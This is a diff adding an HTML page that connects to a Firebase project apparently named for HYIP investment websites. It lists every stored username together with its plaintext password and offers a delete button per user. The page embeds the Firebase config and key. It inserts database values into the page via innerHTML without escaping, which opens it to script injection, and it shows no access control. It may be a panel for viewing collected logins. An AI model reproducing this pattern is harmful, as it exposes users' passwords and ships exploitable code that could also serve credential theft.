@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Users</title>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.1/firebase-database.js"></script>
+</head>
+<body>
+    <h1>All Users:</h1>
+    <div id="users"></div>
+
+    <script>
+        var firebaseConfig = {
+            apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+            authDomain: "hyip-html-websites.firebaseapp.com",
+            databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+            projectId: "hyip-html-websites",
+            storageBucket: "hyip-html-websites.appspot.com",
+            messagingSenderId: "241224051127",
+            appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+            measurementId: "G-QLBNBX70XP"
+        };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        var db = firebase.database();
+
+db.ref('users').orderByChild('timestamp').on('value', function(snapshot) {
+    var users = snapshot.val();
+    var usersDiv = document.getElementById('users');
+    usersDiv.innerHTML = '';
+
+    for(var id in users) {
+        var user = users[id];
+        usersDiv.innerHTML += `<p><strong>Username:</strong> ${user.username}</p>`;
+        usersDiv.innerHTML += `<p><strong>Password:</strong> ${user.password}</p>`;
+        usersDiv.innerHTML += `<button onclick="deleteUser('${id}')">Delete User</button>`;
+        usersDiv.innerHTML += '<hr>';
+    }
+});
+
+        function deleteUser(id) {
+            if(confirm("Are you sure you want to delete this user?")) {
+                db.ref('users/' + id).remove();
+            }
+        }
+    </script>
+</body>
+</html>
